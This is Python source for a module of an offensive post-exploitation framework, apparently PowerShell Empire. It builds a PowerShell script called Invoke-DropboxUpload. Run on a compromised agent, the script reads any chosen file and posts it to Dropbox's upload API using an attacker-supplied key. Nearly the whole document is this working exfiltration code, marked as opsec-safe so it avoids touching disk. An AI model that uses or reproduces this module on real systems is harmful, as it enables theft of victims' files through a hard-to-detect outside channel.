from lib.common import helpers


class Module:

    def __init__(self, mainMenu, params=[]):

        # Metadata info about the module, not modified during runtime
        self.info = {
            # Name for the module that will appear in module menus
            'Name': 'Invoke-DropboxUpload',

            # List of one or more authors for the module
            'Author': ['kdick@tevora.com','Laurent Kempe'],

            # More verbose multi-line description of the module
            'Description': ('Upload a file to dropbox '),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': None,

            # True if the module needs admin rights to run
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': True,

            # The language for this module
            'Language': 'powershell',

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion': '2',

            # List of any references/other comments
            'Comments': [
                'Uploads specified file to dropbox ',
                'Ported to powershell2 from script by Laurent Kempe: http://laurentkempe.com/2016/04/07/Upload-files-to-DropBox-from-PowerShell/',
                'Use forward slashes for the TargetFilePath'
            ]
        }

        # Any options needed by the module, settable during runtime
        self.options = {
            # Format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description':   'Agent to use',
                'Required'   :   True,
                'Value'      :   ''
            },
            'SourceFilePath': {
                'Description':   '/path/to/file',
                'Required'   :   True,
                'Value'      :   ''
            },
            'TargetFilePath': {
                'Description': '/path/to/dropbox/file',
                'Required': True,
                'Value': ''
            },
            'ApiKey': {
                'Description': 'Your dropbox api key',
                'Required': True,
                'Value': ''
            }
        }

        # Save off a copy of the mainMenu object to access external
        #   functionality like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters are passed as
        #   an object set to the module and the options dictionary is
        #   automatically set. This is mostly in case options are passed on
        #   the command line.
        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        script = """
function Invoke-DropboxUpload {
Param(
    [Parameter(Mandatory=$true)]
    [string]$SourceFilePath,
    [Parameter(Mandatory=$true)]
    [string]$TargetFilePath,
    [Parameter(mandatory=$true)]
    [string]$ApiKey
)

$url = "https://content.dropboxapi.com/2/files/upload"

$file = [IO.File]::ReadAllBytes($SourceFilePath)
[net.httpWebRequest] $req = [net.webRequest]::create($url)

$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $ApiKey

$req.method = "POST"
$req.Headers.Add("Authorization", $authorization)
$req.Headers.Add("Dropbox-API-Arg", $arg)
$req.ContentType = 'application/octet-stream'
$req.ContentLength = $file.length
$req.TimeOut = 50000
$req.KeepAlive = $true
$req.Headers.Add("Keep-Alive: 300");
$reqst = $req.getRequestStream()
$reqst.write($file, 0, $file.length)
$reqst.flush()
$reqst.close()

[net.httpWebResponse] $res = $req.getResponse()
$resst = $res.getResponseStream()
$sr = new-object IO.StreamReader($resst)
$result = $sr.ReadToEnd()
$result
$res.close()
}

Invoke-DropboxUpload  """

        # Add any arguments to the end execution of the script
        for option, values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])
        
        return script
